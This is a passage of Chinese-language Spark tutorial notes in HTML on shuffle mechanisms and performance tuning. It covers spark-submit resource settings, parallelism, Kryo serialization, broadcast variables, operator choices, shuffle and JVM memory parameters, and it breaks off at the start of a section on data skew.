实现机制条件还是比较苛刻的</p><h3 id="3-4-基于-Sort-的-Shuffle-机制的优缺点">3.4 基于 Sort 的 Shuffle 机制的优缺点</h3><p><strong>优点</strong>：</p><ul><li>小文件的数量大量减少，Mapper 端的内存占用变少；</li><li>Spark 不仅可以处理小规模的数据，即使处理大规模的数据，也不会很容易达到性能瓶颈。</li></ul><p><strong>缺点</strong>：</p><ul><li>如果 Mapper 中 Task 的数量过大，依旧会产生很多小文件，此时在 Shuffle 传数据的过程中到 Reducer 端， Reducer 会需要同时大量地记录进行反序列化，导致大量内存消耗和 GC 负担巨大，造成系统缓慢，甚至崩溃；</li><li>强制了在 Mapper 端必须要排序，即使数据本身并不需要排序；</li><li>它要基于记录本身进行排序，这就是 Sort-Based Shuffle 最致命的性能消耗。</li></ul><h1>三、Spark 性能调优</h1><h2 id="1、常规性能优化">1、常规性能优化</h2><h3 id="1-1-最优资源配置">1.1 最优资源配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 标准的 Spark 任务提交脚本</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class com.atguigu.spark.Analysis \</span><br><span class="line">--master yarn</span><br><span class="line">--deploy-mode cluster</span><br><span class="line">--num-executors 80 \</span><br><span class="line">--driver-memory 6g \</span><br><span class="line">--executor-memory 6g \</span><br><span class="line">--executor-cores 3 \</span><br><span class="line">/usr/opt/modules/spark/jar/spark.jar </span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以进行分配的资源</span></span><br><span class="line"><span class="comment"># --num-executors  配置 Executor 的数量</span></span><br><span class="line"><span class="comment"># --driver-memory  配置 Driver 内存（ 影响不大）</span></span><br><span class="line"><span class="comment"># --executor-memory  配置每个 Executor 的内存大小</span></span><br><span class="line"><span class="comment"># --executor-cores  配置每个 Executor 的 CPU core 数量</span></span><br></pre></td></tr></table></figure><p>对于具体资源的分配，我们分别讨论 Spark 的两种Cluster 运行模式：</p><ul><li>第一种是 Spark Standalone 模式，你在提交任务前，一定知道或者可以从运维部门获取到你可以使用的资源情况，在编写 submit 脚本的时候，就根据可用的资源情况进行资源的分配，比如说集群有 15 台机器，每台机器为 8G 内存，2 个 CPU core，那么就指定 15 个 Executor，每个 Executor 分配 8G 内存，2 个 CPU core</li><li>第二种是 Spark Yarn 模式，由于 Yarn 使用资源队列进行资源的分配和调度，在编写submit 脚本的时候，就根据 Spark 作业要提交到的资源队列，进行资源的分配，比如资源队列有 400G 内存，100 个 CPU core，那么指定 50 个 Executor，每个 Executor 分配8G 内存，2 个 CPU core</li></ul><p>对各项资源进行了调节后，得到的性能提升会有如下表现</p><table><thead><tr><th><strong>名称</strong></th><th><strong>解析</strong></th></tr></thead><tbody><tr><td>增加 Executor个数</td><td>在资源允许的情况下，增加 Executor 的个数可以提高执行 task 的并行度。比如有 4 个Executor，每个 Executor 有 2 个 CPU core，那么可以并行执行 8 个 task，如果将 Executor 的个数增加到 8 个（ 资源允许的情况下）， 那么可以并行执行 16 个 task， 此时的并行能力提升了一倍</td></tr><tr><td>增加每个 Executor 的 CPU core 个数</td><td>在资源允许的情况下，增加每个 Executor 的Cpu core 个数， 可以提高执行 task 的并行度。比如有 4 个 Executor，每个 Executor 有 2 个CPU core，那么可以并行执行 8 个 task，如果将每个 Executor 的 CPU core 个数增加到 4 个（ 资源允许的情况下），那么可以并行执行 16个 task， 此时的并行能力提升了一倍</td></tr><tr><td>增加每个 Executor 的内存量</td><td>在资源允许的情况下，增加每个 Executor 的内存量以后， 对性能的提升有三点：1. 可以缓存更多的数据（ 即对 RDD 进行 cache）， 写入磁盘的数据相应减少， 甚至可以不写入磁盘， 减少了可能的磁盘 IO；2. 可以为 shuffle 操作提供更多内存，即有更多空间来存放 reduce 端拉取的数据，写入磁盘的数据相应减少，甚至可以不写入磁盘， 减少了可能的磁盘 IO；3. 可以为 task 的执行提供更多内存，在 task 的执行过程中可能创建很多对象，内存较小时会引发频繁的 GC， 增加内存后， 可以避免频繁的 GC， 提升整体性能。</td></tr></tbody></table><p>补充：生产环境 Spark submit 脚本配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit \</span><br><span class="line">--class com.atguigu.spark.WordCount \</span><br><span class="line">--master yarn\</span><br><span class="line">--deploy-mode cluster\</span><br><span class="line">--num-executors 80 \</span><br><span class="line">--driver-memory 6g \</span><br><span class="line">--executor-memory 6g \</span><br><span class="line">--executor-cores 3 \</span><br><span class="line">--queue root.default \</span><br><span class="line">--conf spark.yarn.executor.memoryOverhead=2048 \</span><br><span class="line">--conf spark.core.connection.ack.wait.timeout=300 \</span><br><span class="line">/usr/<span class="built_in">local</span>/spark/spark.jar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数配置参考值：</span></span><br><span class="line"><span class="comment"># --num-executors：50~100</span></span><br><span class="line"><span class="comment"># --driver-memory：1G~5G</span></span><br><span class="line"><span class="comment"># --executor-memory：6G~10G</span></span><br><span class="line"><span class="comment"># --executor-cores：3</span></span><br><span class="line"><span class="comment"># --master：实际生产环境一定使用 yarn</span></span><br></pre></td></tr></table></figure><h3 id="1-2-并行度调节">1.2 并行度调节</h3><p>Spark 作业中的并行度指各个 stage 的 task 的数量。如果并行度设置不合理而导致并行度过低，会导致资源的极大浪费，例如，20 个Executor，每个Executor 分配 3 个CPU core，而 Spark 作业有 40 个 task，这样每个 Executor 分配到的task 个数是 2 个，这就使得每个 Executor 有一个CPU core 空闲，导致资源的浪费。理想的并行度设置，应该是让并行度与资源相匹配，简单来说就是在资源允许的前提下， 并行度要设置的尽可能大，达到可以充分利用集群资源。合理的设置并行度，可以提升整个Spark 作业的性能和运行速度。</p><p><strong>Spark 官方推荐，task 数量应该设置为 Spark 作业总CPU core 数量的 2~3 倍</strong>。之所以没有推荐 task 数量与CPU core 总数相等，是因为 task 的执行时间不同，有的task 执行速度快而有的 task 执行速度慢，如果 task 数量与CPU core 总数相等，那么执行快的 task 执行完成后，会出现 CPU core 空闲的情况。如果 task 数量设置为CPU core 总数的 2~3 倍，那么一个task 执行完毕后，CPU core 会立刻执行下一个task，降低了资源的浪费，同时提升了 Spark作业运行的效率。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.default.parallelism"</span>, <span class="string">"500"</span>)</span><br></pre></td></tr></table></figure><h3 id="1-3-Kryo-序列化">1.3 Kryo 序列化</h3><p>默认情况下，Spark 使用 Java 的序列化机制。Java 的序列化机制使用方便，不需要额外的配置，在算子中使用的变量实现 Serializable 接口即可，但是，Java 序列化机制的效率不高，序列化速度慢并且序列化后的数据所占用的空间依然较大。</p><p>Kryo 序列化机制比 Java 序列化机制性能提高 10 倍左右，Spark 之所以没有默认使用Kryo 作为序列化类库，是因为它不支持所有对象的序列化，同时 Kryo 需要用户在使用前注册需要序列化的类型，不够方便，但从 Spark 2.0.0 版本开始，<strong>简单类型、简单类型数组、字符串类型的 Shuffling RDDs 已经默认使用Kryo 序列化方式</strong>了。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">MyKryoRegistrator</span> <span class="title">implements</span> <span class="title">KryoRegistrator</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  public void registerClasses(<span class="type">Kryo</span> kryo)&#123;</span><br><span class="line">    kryo.register(<span class="type">StartupReportLogs</span><span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置Kryo 序列化方式的实例代码</span></span><br><span class="line"><span class="comment">//创建 SparkConf 对象</span></span><br><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(…).setAppName(…)</span><br><span class="line"><span class="comment">//使用 Kryo 序列化库，如果要使用 Java 序列化库，需要把该行屏蔽掉</span></span><br><span class="line">conf.set(<span class="string">"spark.serializer"</span>, <span class="string">"org.apache.spark.serializer.KryoSerializer"</span>);</span><br><span class="line"><span class="comment">//在 Kryo 序列化库中注册自定义的类集合，如果要使用 Java 序列化库，需要把该行屏蔽掉</span></span><br><span class="line">conf.set(<span class="string">"spark.kryo.registrator"</span>, <span class="string">"atguigu.com.MyKryoRegistrator"</span>);</span><br></pre></td></tr></table></figure><h3 id="1-4-RDD-优化">1.4 RDD 优化</h3><ul><li><p>RDD 复用</p><p>在对RDD 进行算子时，要避免相同的算子和计算逻辑之下对RDD 进行重复的计算</p></li><li><p>RDD 持久化</p><ul><li>RDD 的持久化是可以进行序列化的，当内存无法将 RDD 的数据完整的进行存放的时候，可以考虑使用序列化的方式减小数据体积，将数据完整存储在内存中</li><li>如果对于数据的可靠性要求很高，并且内存充足，可以使用副本机制，对 RDD 数据进行持久化。当持久化启用了复本机制时，对于持久化的每个数据单元都存储一个副本， 放在其他节点上面，由此实现数据的容错，一旦一个副本数据丢失，不需要重新计算，还可以使用另外一个副本。</li></ul></li><li><p>RDD 尽可能早的 filter 操作</p></li></ul><h3 id="1-5-广播大变量">1.5 广播大变量</h3><p>默认情况下，task 中的算子中如果使用了外部的变量，每个 task 都会获取一份变量的复本，这就造成了内存的极大消耗。一方面，如果后续对 RDD 进行持久化，可能就无法将 RDD 数据存入内存，只能写入磁盘，磁盘 IO 将会严重消耗性能；另一方面，task 在创建对象的时候，也许会发现堆内存无法存放新创建的对象，这就会导致频繁的 GC，GC 会导致工作线程停止，进而导致 Spark 暂停工作一段时间，严重影响 Spark 性能。</p><p>在初始阶段，广播变量只在 Driver 中有一份副本。task 在运行的时候，想要使用广播变量中的数据，此时首先会在自己本地的Executor 对应的BlockManager 中尝试获取变量，如果本地没有，BlockManager 就会从 Driver 或者其他节点BlockManager 上远程拉取变量的复本，并由本地的BlockManager 进行管理；之后此Executor 的所有 task 都会直接从本地的BlockManager 中获取变量</p><p>Spark join 策略中，如果当一张小表足够小并且可以先缓存到内存中，那么可以使用 Broadcast Hash Join,其原理就是先将小表聚合到 driver 端，再广播到各个大表分区中，那么再次进行 join 的时候，就相当于大表的各自分区的数据与小表进行本地 join，从而规避了 shuffle。广播 join 默认值为 10MB，由<code>spark.sql.autoBroadcastJoinThreshold</code>参数控制</p><h3 id="1-6-调节本地化等待时长">1.6 调节本地化等待时长</h3><p>Spark 作业运行过程中，Driver 会对每一个 stage 的 task 进行分配。根据 Spark 的task 分配算法，Spark 希望 task 能够运行在它要计算的数据算在的节点（数据本地化思想），这样就可以避免数据的网络传输。通常来说，task 可能不会被分配到它处理的数据所在的节点， 因为这些节点可用的资源可能已经用尽，此时，Spark 会等待一段时间，<strong>默认 3s</strong>，如果等待指定时间后仍然无法在指定节点运行，那么会自动降级，尝试将 task 分配到比较差的本地化级别所对应的节点上，比如将 task 分配到离它要计算的数据比较近的一个节点，然后进行计算，如果当前级别仍然不行，那么继续降级。</p><p>当 task 要处理的数据不在 task 所在节点上时，会发生数据的传输。task 会通过所在节点的BlockManager 获取数据，BlockManager 发现数据不在本地时，会通过网络传输组件从数据所在节点的BlockManager 处获取数据。网络传输数据的情况是我们不愿意看到的，大量的网络传输会严重影响性能，因此，我们希望通过调节本地化等待时长，如果在等待时长这段时间内，目标节点处理完成了一部分task，那么当前的 task 将有机会得到执行，这样就能够改善 Spark 作业的整体性能</p><table><thead><tr><th><strong>名称</strong></th><th><strong>解析</strong></th></tr></thead><tbody><tr><td>PROCESS_LOCAL</td><td>进程本地化，task 和数据在同一个 Executor 中，性能最好</td></tr><tr><td>NODE_LOCAL</td><td>节点本地化，task 和数据在同一个节点中，但是task和数据不在同一个 Executor 中，数据需要在进程间进行传输</td></tr><tr><td>RACK_LOCAL</td><td>机架本地化，task 和数据在同一个机架的两个节点上，数据需要通过网络在节点之间进行传输</td></tr><tr><td>NO_PREF</td><td>对于 task 来说，从哪里获取都一样，没有好坏之分</td></tr><tr><td>ANY</td><td>task 和数据可以在集群的任何地方，而且不在一个机架中，性能最差</td></tr></tbody></table><p>在 Spark 项目开发阶段，可以使用 client 模式对程序进行测试，此时，可以在本地看到比较全的日志信息， 日志信息中有明确的 task 数据本地化的级别， 如果大部分都是PROCESS_LOCAL，那么就无需进行调节，但是如果发现很多的级别都是 NODE_LOCAL、ANY，那么需要对本地化的等待时长进行调节，通过延长本地化等待时长，看看 task 的本地化级别有没有提升，并观察 Spark 作业的运行时间有没有缩短。</p><p>注意，过犹不及，不要将本地化等待时长延长地过长，导致因为大量的等待时长，使得Spark 作业的运行时间反而增加了。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.locality.wait"</span>, <span class="string">"6"</span>)</span><br></pre></td></tr></table></figure><h2 id="2、算子调优">2、算子调优</h2><h3 id="2-1-mapPartitions">2.1 mapPartitions</h3><p>普通的 map 算子对RDD 中的每一个元素进行操作，而 mapPartitions 算子对RDD 中每一个分区进行操作。如果是普通的 map 算子，假设一个 partition 有 1 万条数据，那么 map算子中的 function 要执行 1 万次，也就是对每个元素进行操作</p><p>如果是 mapPartition 算子，由于一个 task 处理一个 RDD 的 partition，那么<strong>一个 task 只会执行一次function，function 一次接收所有的partition 数据</strong>，效率比较高。比如，当要把 RDD 中的所有数据通过 JDBC 写入数据，如果使用 map 算子，那么需要对 RDD 中的每一个元素都创建一个数据库连接，这样对资源的消耗很大，如果使用mapPartitions 算子，那么针对一个分区的数据，只需要建立一个数据库连接</p><p>mapPartitions 算子也存在一些缺点：对于普通的 map 操作，一次处理一条数据，如果在处理了 2000 条数据后内存不足，那么可以将已经处理完的 2000 条数据从内存中垃圾回收掉；但是如果使用mapPartitions 算子，但数据量非常大时，function 一次处理一个分区的数据，如果一旦内存不足，此时无法回收内存，就可能会OOM，即内存溢出。因此，<strong>mapPartitions 算子适用于数据量不是特别大的时候</strong>，此时使用 mapPartitions 算子对性能的提升效果还是不错的。（当数据量很大的时候，一旦使用 mapPartitions 算子，就会直接OOM）</p><p>在项目中，应该首先估算一下 RDD 的数据量、每个 partition 的数据量，以及分配给每个 Executor 的内存资源，如果资源允许，可以考虑使用 mapPartitions 算子代替 map</p><h3 id="2-2-foreachPartition-优化数据库操作">2.2 foreachPartition 优化数据库操作</h3><p>在生产环境中，<strong>通常使用 foreachPartition 算子来完成数据库的写入</strong>，通过 foreachPartition算子的特性，可以优化写数据库的性能。如果使用 foreach 算子完成数据库的操作，由于 foreach 算子是遍历 RDD 的每条数据， 因此，每条数据都会建立一个数据库连接，这是对资源的极大浪费，因此，对于写数据库操作，我们应当使用foreachPartition 算子。与 mapPartitions 算子非常相似，foreachPartition 是将 RDD 的每个分区作为遍历对象， 一次处理一个分区的数据，也就是说，如果涉及数据库的相关操作，一个分区的数据只需要创建一次数据库连接</p><p>使用了 foreachPartition 算子后，可以获得以下的性能提升：</p><ul><li>对于我们写的 function 函数，一次处理一整个分区的数据；</li><li>对于一个分区内的数据，创建唯一的数据库连接；</li><li>只需要向数据库发送一次 SQL 语句和多组参数；</li></ul><p>在生产环境中，全部都会使用 foreachPartition 算子完成数据库操作。foreachPartition 算子存在一个问题，与 mapPartitions 算子类似，如果一个分区的数据量特别大，可能会造成 OOM， 即内存溢出。</p><h3 id="2-3-filter-与-coalesce-的配合使用">2.3 filter 与 coalesce 的配合使用</h3><p>在 Spark 任务中我们经常会使用 filter 算子完成 RDD 中数据的过滤，在任务初始阶段， 从各个分区中加载到的数据量是相近的，但是一旦进过 filter 过滤后，每个分区的数据量有可能会存在较大差异</p><p>repartition 与 coalesce 都可以用来进行重分区，其中 repartition 只是 coalesce 接口中 shuffle为 true 的简易实现，coalesce 默认情况下不进行 shuffle，但是可以通过参数进行设置。假设我们希望将原本的分区个数A 通过重新分区变为 B，那么有以下几种情况</p><ul><li><p><strong>A &gt; B（多数分区合并为少数分区）</strong></p><ul><li>A 与 B 相差值不大，此时使用 coalesce 即可，无需 shuffle 过程。</li></ul></li><li><p>A 与 B 相差值很大，此时可以使用 coalesce 并且不启用 shuffle 过程，但是会导致合并过程性能低下，所以推荐设置 coalesce 的第二个参数为 true，即启动 shuffle 过程</p></li><li><p><strong>A &lt; B（少数分区分解为多数分区）</strong></p><p>此时使用 repartition 即可，如果使用 coalesce 需要将 shuffle 设置为 true，否则 coalesce 无效。我们可以在filter 操作之后，使用 coalesce 算子针对每个partition 的数据量各不相同的情况， 压缩 partition 的数量，而且让每个 partition 的数据量尽量均匀紧凑，以便于后面的 task 进行计算操作，在某种程度上能够在一定程度上提升性能。</p><p>注意：local 模式是进程内模拟集群运行，已经对并行度和分区数量有了一定的内部优化，因此不用去设置并行度和分区数量。</p></li></ul><h3 id="2-4-repartition-解决-SparkSQL-低并行度问题">2.4 repartition 解决 SparkSQL 低并行度问题</h3><p>并行度的设置对于Spark SQL 是不生效的，用户设置的并行度只对于 Spark SQL 以外的所有 Spark 的 stage 生效。Spark SQL 的并行度不允许用户自己指定，Spark SQL 自己会默认根据 hive 表对应的HDFS 文件的 split 个数自动设置 Spark SQL 所在的那个 stage 的并行度，用户自己通过<code>spark.default.parallelism</code> 参数指定的并行度，只会在 Spark SQL 的 stage 中生效。</p><p>由于 Spark SQL 所在 stage 的并行度无法手动设置，如果数据量较大，并且此 stage 中后续的 transformation 操作有着复杂的业务逻辑，而 Spark SQL 自动设置的 task 数量很少， 这就意味着每个 task 要处理为数不少的数据量，然后还要执行非常复杂的处理逻辑，这就可能表现为第一个有 Spark SQL 的 stage 速度很慢，而后续的没有 Spark SQL 的 stage 运行速度非常快。</p><p>为了解决 Spark SQL 无法设置并行度和 task 数量的问题，我们可以使用 repartition 算子。Spark SQL 这一步的并行度和 task 数量肯定是没有办法去改变了，但是，对于Spark SQL 查询出来的 RDD， 立即使用 repartition 算子， 去重新进行分区， 这样可以重新分区为多个 partition，从 repartition 之后的 RDD 操作，由于不再设计 SparkSQL，因此 stage 的并行度就会等于你手动设置的值，这样就避免了 Spark SQL 所在的 stage 只能用少量的 task 去处理大量数据并执行复杂的算法逻辑。</p><h3 id="2-5-reduceByKey-预聚合">2.5 reduceByKey 预聚合</h3><p>reduceByKey 相较于普通的 shuffle 操作一个显著的特点就是会进行map 端的本地聚合，map 端会先对本地的数据进行 combine 操作，然后将数据写入给下个 stage 的每个 task 创建的文件中，也就是在 map 端，对每一个 key 对应的 value，执行 reduceByKey 算子函数。使用 reduceByKey 对性能的提升如下：</p><ul><li>本地聚合后，在 map 端的数据量变少，减少了磁盘 IO，也减少了对磁盘空间的占用；</li><li>本地聚合后，下一个 stage 拉取的数据量变少，减少了网络传输的数据量；</li><li>本地聚合后，在 reduce 端进行数据缓存的内存占用减少；</li><li>本地聚合后，在 reduce 端进行聚合的数据量减少。</li></ul><p>基于 reduceByKey 的本地聚合特征，我们应该考虑使用 reduceByKey 代替其他的 shuffle 算子。groupByKey 不会进行 map 端的聚合，而是将所有 map 端的数据 shuffle 到reduce 端，然后在 reduce 端进行数据的聚合操作。由于 reduceByKey 有 map 端聚合的特性， 使得网络传输的数据量减小，因此效率要明显高于groupByKey</p><h2 id="3、Shuffle-调优">3、Shuffle 调优</h2><h3 id="3-1-调节-map-端缓冲区大小">3.1 调节 map 端缓冲区大小</h3><p>在 Spark 任务运行过程中，如果 shuffle 的 map 端处理的数据量比较大，但是map 端缓冲的大小是固定的，可能会出现 map 端缓冲数据频繁 spill 溢写到磁盘文件中的情况，使得性能非常低下，通过调节 map 端缓冲的大小，可以避免频繁的磁盘 IO 操作，进而提升 Spark 任务的整体性能。</p><p>map 端缓冲的默认配置是 32KB，如果每个 task 处理 640KB 的数据，那么会发生 640/32= 20 次溢写，如果每个 task 处理 64000KB 的数据，机会发生 64000/32=2000 此溢写，这对于性能的影响是非常严重的。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.shuffle.file.buffer"</span>, <span class="string">"64"</span>)</span><br></pre></td></tr></table></figure><h3 id="3-2-调节-reduce-端拉取数据缓冲区大小">3.2 调节 reduce 端拉取数据缓冲区大小</h3><p>Spark Shuffle 过程中，shuffle reduce task 的 buffer 缓冲区大小决定了reduce task 每次能够缓冲的数据量，也就是每次能够拉取的数据量，如果内存资源较为充足，适当增加拉取数据缓冲区的大小，可以减少拉取数据的次数，也就可以减少网络传输的次数，进而提升性能。reduce 端数据拉取缓冲区的大小可以通过 <code>spark.reducer.maxSizeInFlight</code> 参数进行设置，默认为 48MB</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.reducer.maxSizeInFlight"</span>, <span class="string">"96"</span>)</span><br></pre></td></tr></table></figure><h3 id="3-3-调节-reduce-端拉取数据重试次数">3.3 调节 reduce 端拉取数据重试次数</h3><p>Spark Shuffle 过程中，reduce task 拉取属于自己的数据时，如果因为网络异常等原因导致失败会自动进行重试。对于那些包含了特别耗时的 shuffle 操作的作业，建议增加重试最大次数（比如 60 次），以避免由于 JVM 的 full gc 或者网络不稳定等因素导致的数据拉取失败。在实践中发现，对于针对超大数据量（数十亿~上百亿）的 shuffle 过程，调节该参数可以大幅度提升稳定性。</p><p>reduce 端拉取数据重试次数可以通过 <code>spark.shuffle.io.maxRetries</code> 参数进行设置，该参数就代表了可以重试的最大次数。如果在指定次数之内拉取还是没有成功，就可能会导致作业执行失败，默认为 3</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.shuffle.io.maxRetries"</span>, <span class="string">"6"</span>)</span><br></pre></td></tr></table></figure><h3 id="3-4-调节-reduce-端拉取数据等待间隔">3.4 调节 reduce 端拉取数据等待间隔</h3><p>Spark Shuffle 过程中，reduce task 拉取属于自己的数据时，如果因为网络异常等原因导致失败会自动进行重试，在一次失败后，会等待一定的时间间隔再进行重试，可以通过加大间隔时长（比如 60s），以增加 shuffle 操作的稳定性。reduce 端拉取数据等待间隔可以通过 <code>spark.shuffle.io.retryWait</code> 参数进行设置， 默认值为 5s</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.shuffle.io.retryWait"</span>, <span class="string">"60s"</span>)</span><br></pre></td></tr></table></figure><h3 id="3-5-调节-SortShuffle-排序操作阈值">3.5 调节 SortShuffle 排序操作阈值</h3><p>对于 SortShuffleManager，如果 shuffle reduce task 的数量小于某一阈值则 shuffle write 过程中不会进行排序操作，而是直接按照未经优化的 HashShuffleManager 的方式去写数据，但是最后会将每个 task 产生的所有临时磁盘文件都合并成一个文件，并会创建单独的索引文件。</p><p>当你使用 SortShuffleManager 时，如果的确不需要排序操作，那么建议将这个参数调大一些，大于 shuffle read task 的数量，那么此时 map-side 就不会进行排序了，减少了排序的性能开销，但是这种方式下，依然会产生大量的磁盘文件，因此 shuffle write 性能有待提高。SortShuffleManager 排序操作阈值的设置可以通过<code>spark.shuffle.sort. bypassMergeThreshold</code> 这一参数进行设置，默认值为 200</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.shuffle.sort.bypassMergeThreshold"</span>, <span class="string">"400"</span>)</span><br></pre></td></tr></table></figure><h2 id="4、JVM-调优">4、JVM 调优</h2><blockquote><p>full gc/minor gc都会导致 JVM 的工作线程停止工作， 即 stop the world</p></blockquote><h3 id="4-1-降低-cache-操作的内存占比">4.1 降低 cache 操作的内存占比</h3><ul><li><strong>静态内存管理机制</strong></li></ul><p>根据 Spark 静态内存管理机制，堆内存被划分为了两块，Storage 和 Execution。<strong>Storage 主要用于缓存RDD 数据和 broadcast 数据，Execution 主要用于缓存在 shuffle 过程中产生的中间数据，Storage 占系统内存的 60%，Execution 占系统内存的 20%，并且两者完全独立</strong>。在一般情况下，Storage 的内存都提供给了cache 操作，但是如果在某些情况下 cache 操作内存不是很紧张，而 task 的算子中创建的对象很多，Execution 内存又相对较小，这回导致频繁的 minor gc，甚至于频繁的 full gc，进而导致 Spark 频繁的停止工作，性能影响会很大。在 Spark UI 中可以查看每个 stage 的运行情况，包括每个 task 的运行时间、gc 时间等等，如果发现 gc 太频繁，时间太长，就可以考虑调节 Storage 的内存占比，让 task 执行算子函数式，有更多的内存可以使用。Storage 内存区域可以通过 <code>spark.storage.memoryFraction</code> 参数进行指定，默认为 0.6，60%，可以逐级向下递减</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.storage.memoryFraction"</span>, <span class="string">"0.4"</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>统一内存管理机制</strong></li></ul><p>根据 Spark 统一内存管理机制，堆内存被划分为了两块，Storage 和 Execution。Storage 主要用于缓存数据，Execution 主要用于缓存在 shuffle 过程中产生的中间数据，两者所组成的内存部分称为统一内存，Storage 和Execution 各占统一内存的 50%，由于动态占用机制的实现，shuffle 过程需要的内存过大时，会自动占用 Storage 的内存区域，因此无需手动进行调节。</p><h3 id="4-2-调节-Executor-堆外内存">4.2 调节 Executor 堆外内存</h3><p>Executor 的堆外内存主要用于程序的共享库、Perm Space、 线程 Stack 和一些 Memory mapping 等, 或者类C 方式 allocate object。有时，如果你的 Spark 作业处理的数据量非常大，达到几亿的数据量，此时运行 Spark 作业会时不时地报错，例如 shuffle output file cannot find，executor lost，task lost，out of memory 等，这可能是Executor 的堆外内存不太够用，导致Executor 在运行的过程中内存溢出。</p><p>stage 的 task 在运行的时候，可能要从一些 Executor 中去拉取 shuffle map output 文件， 但是Executor 可能已经由于内存溢出挂掉了，其关联的BlockManager 也没有了，这就可能会报出 shuffle output file cannot find，executor lost，task lost，out of memory 等错误，此时， 就可以考虑调节一下 Executor 的堆外内存，也就可以避免报错，与此同时，堆外内存调节的比较大的时候，对于性能来讲，也会带来一定的提升。<strong>默认情况下，Executor 堆外内存上限大概为 300 多 MB</strong>，在实际的生产环境下，对海量数据进行处理的时候，这里都会出现问题，导致 Spark 作业反复崩溃，无法运行，此时就会去调节这个参数，到至少 1G，甚至于 2G、4G</p><p>Executor 堆外内存的配置需要在 spark-submit 脚本里配置<code>--conf spark.yarn.executor.memoryOverhead=2048</code>，以上参数配置完成后，会避免掉某些 JVM OOM 的异常问题，同时，可以提升整体 Spark作业的性能</p><h3 id="4-3-调节连接等待时长">4.3 调节连接等待时长</h3><p>在 Spark 作业运行过程中，Executor 优先从自己本地关联的 BlockManager 中获取某份数据，如果本地BlockManager 没有的话，会通过TransferService 远程连接其他节点上Executor 的 BlockManager 来获取数据。</p><p>如果 task 在运行过程中创建大量对象或者创建的对象较大，会占用大量的内存，这回导致频繁的垃圾回收，但是垃圾回收会导致工作现场全部停止，也就是说，垃圾回收一旦执行，Spark 的Executor 进程就会停止工作，无法提供相应，此时，由于没有响应，无法建立网络连接，会导致网络连接超时。</p><p>在生产环境下，有时会遇到 file not found、file lost 这类错误，在这种情况下，很有可能是 Executor 的BlockManager 在拉取数据的时候，无法建立连接，然后超过默认的连接等待时长 60s 后，宣告数据拉取失败，如果反复尝试都拉取不到数据，可能会导致 Spark 作业的崩溃。这种情况也可能会导致 DAGScheduler 反复提交几次 stage，TaskScheduler 返回提交几次 task，大大延长了我们的 Spark 作业的运行时间。此时，可以考虑调节连接的超时时长，连接等待时长需要在 spark-submit 脚本中进行设置<code>--conf spark.core.connection.ack.wait.timeout=300</code>，调节连接等待时长后，通常可以避免部分的 XX 文件拉取失败、XX 文件 lost 等报错</p><h1>四、Spark 数据倾斜</h1><h2 id="1、概述-v2">1、概述</h2><h3 id="1-1-简介-v3">1.1 简介</h3><p>Spark 中的数据倾斜问题主要指 shuffle 